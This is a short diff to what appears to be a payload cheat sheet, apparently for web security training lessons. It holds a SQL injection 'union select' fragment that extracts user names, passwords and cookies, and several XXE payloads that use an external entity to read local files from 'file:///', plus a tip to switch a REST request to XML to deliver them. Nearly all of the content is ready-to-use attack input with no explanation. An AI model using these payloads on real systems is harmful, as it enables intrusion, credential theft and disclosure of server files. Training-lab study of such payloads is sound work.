@@ -14,7 +14,7 @@ Smith' union select userid,user_name, password,cookie,cookie, cookie,userid from
 
 ## XXE ##
 
-Simple <?xml version="1.0" standalone="yes" ?><!DOCTYPE comment [<!ENTITY root SYSTEM "file:///"> ]><comment>  <text>&root;</text><password>test</password></comment>
+Simple - <?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
 
 Modern Rest Framework - change content type to: Content-Type: application/xml && 
 <?xml version="1.0" standalone="yes" ?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><user>  <username>&root;</username><password>test</password></user>
